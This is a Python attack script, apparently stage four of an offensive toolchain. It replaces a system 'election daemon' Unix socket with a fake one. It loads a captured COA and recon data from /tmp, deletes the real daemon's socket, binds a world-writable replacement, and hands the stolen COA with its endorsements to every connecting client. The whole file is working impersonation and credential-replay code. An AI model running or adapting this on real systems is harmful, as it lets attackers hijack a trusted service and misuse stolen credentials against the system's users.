#!/usr/bin/env python3
"""
offense/04_replace_election_socket.py

Backstop for the case where a valid COA was captured but the real
system election daemon does not present it. Defaults to values from
/tmp/recon.json and /tmp/captured_coa.json.
"""
from __future__ import annotations

import argparse
import json
import os
import signal
import socket
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
import gg_core  # noqa: E402


def serve(path: str, coa_path: str, listen_backlog: int = 32) -> int:
    try:
        coa_obj = gg_core.load_coa(coa_path)
        coa = coa_obj.to_dict()
    except SystemExit as e:
        print(e, file=sys.stderr)
        return 1

    if not coa_obj.endorsements:
        print("[!] COA has no endorsements; cannot serve.")
        return 1

    print(f"[*] Loaded COA with {len(coa['endorsements'])} endorsements")
    try:
        os.unlink(path)
        print(f"[*] Removed {path}")
    except FileNotFoundError:
        print(f"[*] No existing socket at {path}")
    except PermissionError:
        print(f"[!] Cannot remove {path}; kill electionDaemon first")
        return 1

    server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    try:
        server.bind(path)
        os.chmod(path, 0o777)
        server.listen(listen_backlog)
    except OSError as e:
        print(gg_core.format_socket_error(path, e, action="bind/listen on"), file=sys.stderr)
        server.close()
        return 1

    coa_bytes = json.dumps(coa).encode("utf-8")
    print(f"[+] Fake election socket up at {path}; ctrl-c to stop")

    def _stop(_signum, _frame):
        try:
            server.close()
            os.unlink(path)
        finally:
            sys.exit(0)

    signal.signal(signal.SIGINT, _stop)
    signal.signal(signal.SIGTERM, _stop)

    while True:
        try:
            conn, _ = server.accept()
        except OSError:
            continue
        try:
            conn.sendall(coa_bytes)
        except OSError:
            pass
        finally:
            conn.close()


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--recon", default=gg_core.DEFAULT_RECON_PATH)
    ap.add_argument("--socket", default="")
    ap.add_argument("--coa", default=gg_core.DEFAULT_COA_PATH)
    args = ap.parse_args()

    election_sock = args.socket
    if not election_sock:
        recon = gg_core.load_recon(args.recon)
        election_sock = recon.get("election_socket", "")
    if not election_sock:
        print("[!] No election socket path available", file=sys.stderr)
        return 2
    return serve(election_sock, args.coa)


if __name__ == "__main__":
    sys.exit(gg_core.run_main(main))
